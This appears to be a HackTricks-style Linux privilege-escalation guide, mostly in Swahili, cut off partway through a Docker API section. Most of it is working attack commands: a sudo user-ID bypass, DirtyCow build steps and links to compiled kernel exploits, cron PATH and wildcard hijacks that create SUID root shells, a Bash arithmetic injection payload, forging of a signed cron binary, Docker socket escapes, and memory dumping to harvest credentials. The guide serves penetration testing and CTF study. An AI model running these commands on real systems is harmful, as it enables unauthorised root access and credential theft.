# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Taarifa za Mfumo

### OS taarifa

Hebu tuanze kupata maarifa kuhusu OS inayokimbia
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Ikiwa una **write permissions on any folder inside the `PATH`** variable, unaweza kuwa na uwezo wa hijack baadhi ya libraries au binaries:
```bash
echo $PATH
```
### Env info

Je, kuna taarifa za kuvutia, passwords au API keys katika environment variables?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Kagua toleo la kernel na angalia kama kuna exploit yoyote inayoweza kutumika to escalate privileges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Unaweza kupata orodha nzuri ya kernel yenye udhaifu na baadhi ya **compiled exploits** tayari hapa: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Tovuti nyingine ambapo unaweza kupata baadhi ya **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Ili kutoa matoleo yote ya kernel yenye udhaifu kutoka kwenye tovuti hiyo unaweza kufanya:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Zana ambazo zinaweza kusaidia kutafuta kernel exploits ni:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute IN victim, inacheki tu exploits kwa kernel 2.x)

Daima **tafuta kernel version katika Google**, huenda kernel version yako imeandikwa kwenye exploit fulani ya kernel na hivyo utakuwa na uhakika kwamba exploit hiyo ni halali.

Additional kernel exploitation techniques:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo toleo

Kulingana na matoleo ya sudo yenye udhaifu yanayoonekana katika:
```bash
searchsploit sudo
```
Unaweza kukagua ikiwa toleo la sudo lina udhaifu kwa kutumia grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Toleo za Sudo kabla ya 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) zinamruhusu watumiaji wa ndani wasio na ruhusa kuinua ruhusa zao hadi root kupitia chaguo la sudo `--chroot` wakati faili `/etc/nsswitch.conf` inatumiwa kutoka kwenye directory inayodhibitiwa na mtumiaji.

Hapa kuna [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) ya kutumia ile [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Kabla ya kuendesha exploit, hakikisha toleo lako la `sudo` linaloathirika (vulnerable) na linaunga mkono kipengele cha `chroot`.

Kwa maelezo zaidi, rejea [tangazo la udhaifu](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/) asili

#### sudo < v1.8.28

Kutoka kwa @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg: Uthibitishaji wa saini ulishindwa

Angalia **smasher2 box of HTB** kwa **mfano** wa jinsi vuln hii inaweza kuwa exploited
```bash
dmesg 2>/dev/null | grep "signature"
```
### Zaidi ya utambuzi wa mfumo
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Orodhesha kinga zinazowezekana

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

If you are inside a docker container you can try to escape from it:


{{#ref}}
docker-security/
{{#endref}}

## Diski

Angalia **kilichounganishwa na kisichounganishwa**, wapi na kwa nini. Ikiwa kitu chochote hakijaunganishwa, unaweza kujaribu kuikuunganisha na kukagua taarifa za faragha.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Programu muhimu

Orodhesha binaries muhimu
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Pia, angalia kama **any compiler is installed**. Hii ni muhimu ikiwa utahitaji kutumia kernel exploit, kwa kuwa inashauriwa compile kwenye mashine utakayotumia (au kwenye moja inayofanana).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Programu Zenye Udhaifu Zimewekwa

Kagua **toleo la vifurushi na huduma zilizowekwa**. Huenda kuna toleo la zamani la Nagios (kwa mfano) ambalo linaweza kutumiwa kwa kupandisha ruhusa…\ 
Inashauriwa kukagua kwa mikono toleo la programu zilizo na shaka zaidi zilizowekwa.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Ikiwa una ufikiaji wa SSH kwenye mashine, unaweza pia kutumia **openVAS** kuangalia programu zisizosasishwa na zilizo na udhaifu zilizowekwa kwenye mashine.

> [!NOTE] > _Kumbuka kwamba amri hizi zitaonyesha taarifa nyingi ambazo kwa ujumla hazitakuwa za msaada; kwa hiyo inashauriwa kutumia programu kama OpenVAS au nyingine zinazofanana zitakazokagua ikiwa toleo lolote la programu lililosakinishwa lina udhaifu dhidi ya exploits zinazojulikana_

## Michakato

Angalia ni **michakato gani** inaendeshwa na ukague ikiwa kuna mchakato wowote ana **idhinishwa zaidi kuliko inavyostahili** (labda tomcat inaendeshwa na root?)
```bash
ps aux
ps -ef
top -n 1
```
Daima angalia iwapo [**electron/cef/chromium debuggers** zinaendesha, unaweza kuzitumia ku-escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** hugitambua hizo kwa kuangalia parameter `--inspect` ndani ya mstari wa amri wa process.\
Pia **check your privileges over the processes binaries**, labda unaweza ku-overwrite mtu mwingine.

### Ufuatiliaji wa mchakato

Unaweza kutumia zana kama [**pspy**](https://github.com/DominicBreuker/pspy) kufuatilia processes. Hii inaweza kuwa muhimu sana kutambua processes zilizo vunikiliwa zinaporushwa mara kwa mara au wakati seti ya mahitaji yanatimizwa.

### Kumbukumbu ya mchakato

Baadhi ya services za server huhifadhi **credentials katika clear text ndani ya memory**.\
Kwa kawaida utahitaji **root privileges** kusoma memory ya processes zinazomilikiwa na watumiaji wengine, kwa hivyo hii kawaida ni ya msaada zaidi unapokuwa tayari root na unataka kugundua credentials zaidi.\
Hata hivyo, kumbuka kwamba **kama user wa kawaida unaweza kusoma memory ya processes unazomiliki**.

> [!WARNING]
> Tambua kwamba siku hizi mashine nyingi **haziruhusu ptrace kwa default** ambayo inamaanisha huwezi kudump processes nyingine zinazomilikiwa na unprivileged user wako.
>
> Faili _**/proc/sys/kernel/yama/ptrace_scope**_ inadhibiti upatikanaji wa ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: all processes can be debugged, as long as they have the same uid. This is the classical way of how ptracing worked.
> - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.

#### GDB

Ikiwa una access kwa memory ya service ya FTP (kwa mfano) unaweza kupata Heap na kutafuta ndani yake credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Skripti
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Kwa PID fulani, **maps zinaonyesha jinsi kumbukumbu inavyopangwa ndani ya mchakato huo** virtual address space; pia inaonyesha **permissions za kila eneo lililopangwa**. Faili bandia **mem** **inafunua kumbukumbu za mchakato zenyewe**. Kutoka kwenye faili ya **maps** tunajua ni **maeneo ya kumbukumbu yanayoweza kusomwa** na offsets zao. Tunatumia taarifa hii ili **seek into the mem file and dump all readable regions** kwenye faili.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` hutoa ufikiaji wa kumbukumbu ya **kimwili** ya mfumo, sio kumbukumbu ya pepe. Eneo la anwani pepe la kernel linaweza kufikiwa kwa kutumia /dev/kmem.\
Kawaida, `/dev/mem` inasomwa tu na **root** na kikundi cha **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump kwa linux

ProcDump ni toleo la Linux lililofikiriwa upya la zana ya ProcDump ya jadi kutoka kwa mkusanyiko wa zana za Sysinternals kwa Windows. Pata kwenye [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Vifaa

Ili dump process memory unaweza kutumia:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Unaweza kuondoa kwa mkono mahitaji ya root na dump process inayomilikiwa na wewe
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root inahitajika)

### Credentials from Process Memory

#### Mfano wa kufanya kwa mkono

Ikiwa utakuta kuwa process ya authenticator inaendesha:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Unaweza dump process (tazama sehemu zilizo hapo awali kupata njia tofauti za dump memory ya process) na kutafuta credentials ndani ya memory:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Zana [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) ita **steal clear text credentials from memory** na kutoka kwa baadhi ya **well known files**. Inahitaji root privileges ili ifanye kazi ipasavyo.

| Feature                                           | Process Name         |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Jobs zilizopangwa/Cron

### Crontab UI (alseambusher) running as root – web-based scheduler privesc

Ikiwa paneli ya wavuti ya “Crontab UI” (alseambusher/crontab-ui) inaendeshwa kama root na imefungwa kwa loopback pekee, bado unaweza kuifikia kupitia SSH local port-forwarding na kuunda kazi yenye ruhusa za juu ili kuinua ruhusa.

Mnyororo wa kawaida
- Gundua bandari inayotegemea loopback pekee (mf., 127.0.0.1:8000) na Basic-Auth realm kupitia `ss -ntlp` / `curl -v localhost:8000`
- Tafuta credentials katika artifacts za operesheni:
- Backups/scripts zenye `zip -P <password>`
- systemd unit inayofichua `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Fungua tunnel na ingia:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Unda high-priv job na iendeshe mara moja (inatoa SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Itumie:
```bash
/tmp/rootshell -p   # root shell
```
Kuimarisha usalama
- Usiiendeshe Crontab UI kama root; tumia mtumiaji maalum na ruhusa ndogo
- Funga kwenye localhost na pia zuia upatikanaji kupitia firewall/VPN; usitumia tena nywila
- Epuka kuweka siri ndani ya unit files; tumia secret stores au root-only EnvironmentFile
- Weka audit/logging kwa utekelezaji wa kazi za on-demand

Angalia kama kazi yoyote iliyopangwa iko hatarini. Labda unaweza kuchukua faida ya script inayoendeshwa na root (wildcard vuln? unaweza kubadilisha faili zinazotumiwa na root? tumia symlinks? unda faili maalum katika directory inayotumiwa na root?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

Kwa mfano, ndani ya _/etc/crontab_ unaweza kupata PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Kumbuka jinsi user "user" anavyo kuwa na ruhusa za kuandika juu ya /home/user_)

Ikiwa ndani ya crontab hii mtumiaji root anajaribu kutekeleza amri au script bila kuweka path. Kwa mfano: _\* \* \* \* root overwrite.sh_\
Kisha, unaweza kupata shell ya root kwa kutumia:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron ikitumia script yenye wildcard (Wildcard Injection)

Ikiwa script inatekelezwa na root na ina “**\***” ndani ya amri, unaweza kuitumia kusababisha mambo yasiyotarajiwa (kama privesc). Mfano:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Ikiwa wildcard iko mwishoni mwa njia kama** _**/some/path/\***_ **, haiko dhaifu (hata** _**./\***_ **si dhaifu).**

Soma ukurasa ufuatao kwa mbinu zaidi za wildcard exploitation:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash hufanya parameter expansion na command substitution kabla ya arithmetic evaluation katika ((...)), $((...)) na let. Ikiwa root cron/parser inasoma fields za log zisizotegemewa na kuzipeleka kwenye arithmetic context, attacker anaweza kuingiza command substitution $(...) inayotekelezwa kama root wakati cron inapoendesha.

- Kwa nini inafanya kazi: In Bash, expansions hufanyika kwa mpangilio ufuatao: parameter/variable expansion, command substitution, arithmetic expansion, kisha word splitting na pathname expansion. Kwa hiyo thamani kama `$(/bin/bash -c 'id > /tmp/pwn')0` inawekwa kwanza (kufanya command), kisha nambari iliyobaki `0` inatumika kwa arithmetic ili script iendelee bila makosa.

- Mfano wa kawaida unaoathirika:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Pata text inayodhibitiwa na attacker iandikwe kwenye log inayosomwa ili field inayofanana na namba iwe na command substitution na imeishia kwa digit. Hakikisha command yako haisomi stdout (au iirudishe) ili arithmetic ibaki halali.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

If you **can modify a cron script** executed by root, you can get a shell very easily:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Ikiwa script inayotekelezwa na root inatumia **directory ambapo una ufikiaji kamili**, inaweza kuwa muhimu kufuta folder hiyo na **kuunda folder ya symlink kwa nyingine** inayohudumia script unayodhibiti
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Cron binaries zilizosainiwa kwa desturi na payloads zinazoweza kuandikwa
Blue teams mara nyingine hufanya "sign" cron-driven binaries kwa ku-dump sehemu maalum ya ELF na kutumia grep kutafuta vendor string kabla ya kuzitekeleza kama root. Ikiwa binary hiyo ni group-writable (mfano, `/opt/AV/periodic-checks/monitor` inayomilikiwa na `root:devs 770`) na unaweza leak signing material, unaweza kuforge section na kuiba cron task:

1. Tumia `pspy` kunasa verification flow. Katika Era, root alifanya `objcopy --dump-section .text_sig=text_sig_section.bin monitor` ikifuatiwa na `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` kisha akaendesha faili.
2. Recreate the expected certificate using the leaked key/config (from `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Jenga replacement yenye madhara (kwa mfano, weka SUID bash, ongeza SSH key yako) na embed the certificate ndani ya `.text_sig` ili grep ipite:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Andika juu binary iliyopangwa huku ukihifadhi ruhusa za utekelezaji:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Subiri cron ikimbie mara inayofuata; mara tu ukaguzi wa signature rahisi ukifanikiwa, payload yako itaendeshwa kama root.

### Cron jobs za mara kwa mara

Unaweza kufuatilia michakato kutafuta michakato inayotekelezwa kila dakika 1, 2 au 5. Labda unaweza kutumia hilo na kuinua ruhusa.

Kwa mfano, ili **ku-monitor kila 0.1s kwa dakika 1**, **kupanga kwa amri zilizotekelezwa kidogo** na kufuta amri ambazo zimetekelezwa zaidi, unaweza fanya:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Unaweza pia kutumia** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (hii itafuatilia na kuorodhesha kila mchakato unaoanza).

### Cron jobs zisizoonekana

Inawezekana kuunda cronjob kwa **kuweka carriage return baada ya comment** (bila newline character), na cron job itafanya kazi. Mfano (zingatia carriage return char):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Huduma

### Faili za _.service_ zinazoweza kuandikwa

Angalia ikiwa unaweza kuandika faili yoyote ya `.service`. Ikiwa unaweza, unaweza **kuibadilisha** ili **itekeleze** backdoor yako **mara** huduma **inapoanza**, **inaporudishwa** au **inasimamishwa** (labda utahitaji kusubiri hadi mashine ianzishwe upya).\
Kwa mfano tengeneza backdoor yako ndani ya faili ya .service kwa **`ExecStart=/tmp/script.sh`**

### Binaries za service zinazoweza kuandikwa

Kumbuka kuwa ikiwa una **idhinisho za kuandika kwa binaries zinazotekelezwa na services**, unaweza kuzibadilisha kuwa backdoors, ili huduma zitakapotekelezwa tena, backdoors zitatekelezwa.

### systemd PATH - Relative Paths

Unaweza kuona PATH inayotumika na **systemd** kwa:
```bash
systemctl show-environment
```
Iwapo utagundua kuwa unaweza **kuandika** katika yoyote ya folda za njia hiyo, unaweza kuwa na uwezo wa **kupandisha ruhusa**. Unahitaji kutafuta **relative paths** zinazotumika katika faili za mipangilio ya huduma kama:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Kisha, tengeneza **executable** yenye **jina lilezile kama relative path binary** ndani ya systemd PATH folder ambayo unaweza kuandika, na wakati service itakapoulizwa kutekeleza kitendo chenye udhaifu (**Start**, **Stop**, **Reload**), **backdoor** yako itaendeshwa (watumiaji wasiokuwa na ruhusa kwa kawaida hawawezi kuanzisha/kukomesha services lakini angalia kama unaweza kutumia `sudo -l`).

**Jifunze zaidi kuhusu services kwa kutumia `man systemd.service`.**

## **Timers**

**Timers** ni systemd unit files ambao majina yao yanamalizika kwa `**.timer**` yanayodhibiti faili au matukio ya `**.service**`. **Timers** zinaweza kutumika kama mbadala wa cron kwa kuwa zina msaada uliojengewa ndani kwa matukio ya kalenda na matukio ya wakati monotonic, na zinaweza kuendeshwa kwa asynchronous.

Unaweza kuorodhesha timers zote kwa:
```bash
systemctl list-timers --all
```
### Timers zinazoweza kuandikwa

Ikiwa unaweza kubadilisha timer, unaweza kuifanya itekeleze baadhi ya units zilizopo za systemd.unit (kama `.service` au `.target`)
```bash
Unit=backdoor.service
```
> Unit itakayowekwa kuanzishwa wakati timer hii itakapomalizika. Hoja ni jina la unit, ambacho kiambishi chake si ".timer". Ikiwa haijatajwa, thamani hii kwa chaguo-msingi ni service yenye jina sawa na timer unit, isipokuwa kwa kiambishi. (Angalia hapo juu.) Inashauriwa jina la unit linaloanzishwa na jina la timer unit viwe vinafanana kabisa, isipokuwa kwa kiambishi.

Hivyo basi, ili kutumia vibaya ruhusa hii utahitaji:

- Tafuta unit ya systemd (kama `.service`) ambayo inafanya **executing a writable binary**
- Tafuta unit ya systemd ambayo inafanya **executing a relative path** na una **writable privileges** juu ya **systemd PATH** (ili kujifanya kuwa executable hiyo)

**Jifunze zaidi kuhusu timers kwa `man systemd.timer`.**

### **Kuwezesha Timer**

Ili kuwezesha timer unahitaji root privileges na kuendesha:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Kumbuka **timer** inafunguliwa kwa kuunda symlink kuelekea kwake kwenye `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) zinawawezesha **mawasiliano ya process** kwenye mashine ile ile au mashine tofauti ndani ya modeli za client-server. Zinatumia faili za descriptor za Unix za kawaida kwa mawasiliano kati ya kompyuta na zinaanzishwa kupitia faili za `.socket`.

Sockets zinaweza kusanidiwa kwa kutumia faili za `.socket`.

**Jifunze zaidi kuhusu sockets kwa kutumia `man systemd.socket`.** Ndani ya faili hii, vigezo kadhaa vinavyovutia vinaweza kusanidiwa:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Chaguzi hizi zinatofautiana lakini kwa muhtasari hutumika **kuonyesha wapi itasikiliza** socket (njia ya faili ya AF_UNIX socket, IPv4/6 na/au nambari ya port kusikiliza, n.k.)
- `Accept`: Inapokea hoja ya boolean. Ikiwa **true**, **instance ya service itaamshwa kwa kila connection inayokuja** na socket ya connection pekee ndiyo itapitishwa kwake. Ikiwa **false**, sockets zote za kusikiliza zitatapitishwa kwa service unit iliyozinduliwa, na service unit moja tu itaamshwa kwa connections zote. Thamani hii haisikiliziwi kwa datagram sockets na FIFOs ambapo service unit moja bila masharti inashughulikia trafiki yote inayokuja. **Default ni false**. Kwa sababu za utendaji, inapendekezwa kuandika daemons mpya kwa njia inayofaa kwa `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Inapokea mstari mmoja au zaidi wa amri, ambao hutekelezwa **kabla** au **baada** ya sockets/FIFOs za kusikiliza kuundwa na kuzibind, mtawaliwa. Token ya kwanza ya mstari wa amri lazima iwe absolute filename, ikifuatwa na hoja za mchakato.
- `ExecStopPre`, `ExecStopPost`: Amri za ziada ambazo hutekelezwa kabla au baada sockets/FIFOs za kusikiliza kufungwa na kuondolewa, mtawalia.
- `Service`: Inaeleza jina la service unit **kutumika** kwa trafiki inayokuja. Mipangilio hii inaruhusiwa tu kwa sockets zilizo na Accept=no. Kwa default inatumia service yenye jina sawa na socket (kwa kubadilisha suffix). Katika hali nyingi, haitakuwa muhimu kutumia chaguo hili.

### Writable .socket files

Ikiwa utakuta faili ya `.socket` **inayoweza kuandikwa** unaweza **kuongeza** mwanzoni mwa sehemu ya `[Socket]` kitu kama: `ExecStartPre=/home/kali/sys/backdoor` na backdoor itatekelezwa kabla socket inavyoundwa. Kwa hivyo, **huenda utahitaji kusubiri hadi mashine ianzishwe upya.**\ _Kumbuka kuwa mfumo lazima utumie usanidi wa faili ya socket huo au backdoor haitatekelezwa_

### Writable sockets

Ikiwa **utatambua socket yoyote inayoweza kuandikwa** (_sasa tunazungumzia Unix Sockets na sio kuhusu faili za kusanidi `.socket`_), basi **unaweza kuwasiliana** na socket hiyo na huenda ukatumia udhaifu kuipata.

### Orodhesha Unix Sockets
```bash
netstat -a -p --unix
```
### Muunganisho wa raw
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Kumbuka kwamba kunaweza kuwa na baadhi ya **sockets listening for HTTP** requests (_sio kuhusu .socket files bali kuhusu files zinazofanya kazi kama unix sockets_). Unaweza kuangalia hili kwa:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
If the socket **responds with an HTTP** request, then you can **kuwasiliana** with it and maybe **exploit** some vulnerability.

### Docker Socket Inayoweza Kuandikwa

The Docker socket, often found at `/var/run/docker.sock`, is a critical file that should be secured. By default, it's writable by the `root` user and members of the `docker` group. Possessing write access to this socket can lead to privilege escalation. Here's a breakdown of how this can be done and alternative methods if the Docker CLI isn't available.

#### **Privilege Escalation na Docker CLI**

Ikiwa una ruhusa ya kuandika kwenye Docker socket, unaweza escalate privileges kwa kutumia amri zifuatazo:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Amri hizi zinakuwezesha kuendesha container ikiwa na root-level access kwenye file system ya host.

#### **Kutumia Docker API Moja kwa moja**

Katika hali ambapo Docker CLI haipatikani, Docker socket bado inaweza kudhibitiwa kwa kutumia Docker API na amri za `curl`.

1.  **List Docker Images:** Pata orodha ya images zinazopatikana.

```bash
